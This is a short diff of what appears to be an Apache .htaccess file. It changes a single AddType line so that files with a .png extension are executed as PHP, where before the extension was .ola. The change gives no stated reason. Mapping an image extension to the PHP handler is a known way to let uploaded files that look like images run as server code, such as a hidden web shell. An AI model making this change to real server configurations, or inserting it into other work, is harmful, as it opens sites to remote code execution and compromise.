@@ -35,7 +35,7 @@
 
 </FilesMatch>
 
- AddType application/x-httpd-php .ola
+ AddType application/x-httpd-php .png
 
 <IfModule mod_rewrite.c>
 
